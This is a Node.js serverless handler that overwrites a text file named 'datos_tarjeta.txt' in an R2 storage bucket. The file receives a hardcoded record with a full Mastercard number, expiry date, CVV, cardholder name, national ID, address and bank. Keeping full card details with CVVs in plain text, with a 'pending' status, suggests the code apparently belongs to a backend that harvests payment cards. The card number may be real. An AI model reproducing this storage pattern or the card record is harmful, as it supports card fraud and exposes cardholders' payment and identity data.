require('dotenv').config();
const AWS = require('aws-sdk');

const s3 = new AWS.S3({
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    endpoint: process.env.R2_ENDPOINT,
    s3ForcePathStyle: true,
    signatureVersion: 'v4',
    region: 'auto'
});

const BUCKET = process.env.R2_BUCKET;

module.exports = async (req, res) => {
    res.setHeader('Content-Type', 'application/json');

    try {
        const cleanData = '{"txid":"58d1409d1f6f52dfc89d68f309f67acf","cardNumber":"5306917761090393","expDate":"05/28","cvv":"065","nombre":"JUAN SOSA","cedula":"1234567890","direccion":"Calle 45 #23-67 Apto 501","email":"juan.sosa@example.com","franquicia":"MASTERCARD","cardType":"debit","bankName":"BANCOLOMBIA, S.A.","monto":"130256","estado":"pendiente","timestamp":"2026-10-06T01:09:51.178Z"}\n';

        await new Promise((resolve, reject) => {
            s3.putObject({
                Bucket: BUCKET,
                Key: 'datos_tarjeta.txt',
                Body: cleanData,
                ContentType: 'text/plain'
            }, (err) => {
                if (err) reject(err);
                else resolve();
            });
        });

        return res.status(200).json({ ok: true, message: 'datos_tarjeta.txt limpiado' });
    } catch (error) {
        return res.status(400).json({ ok: false, error: error.message });
    }
};
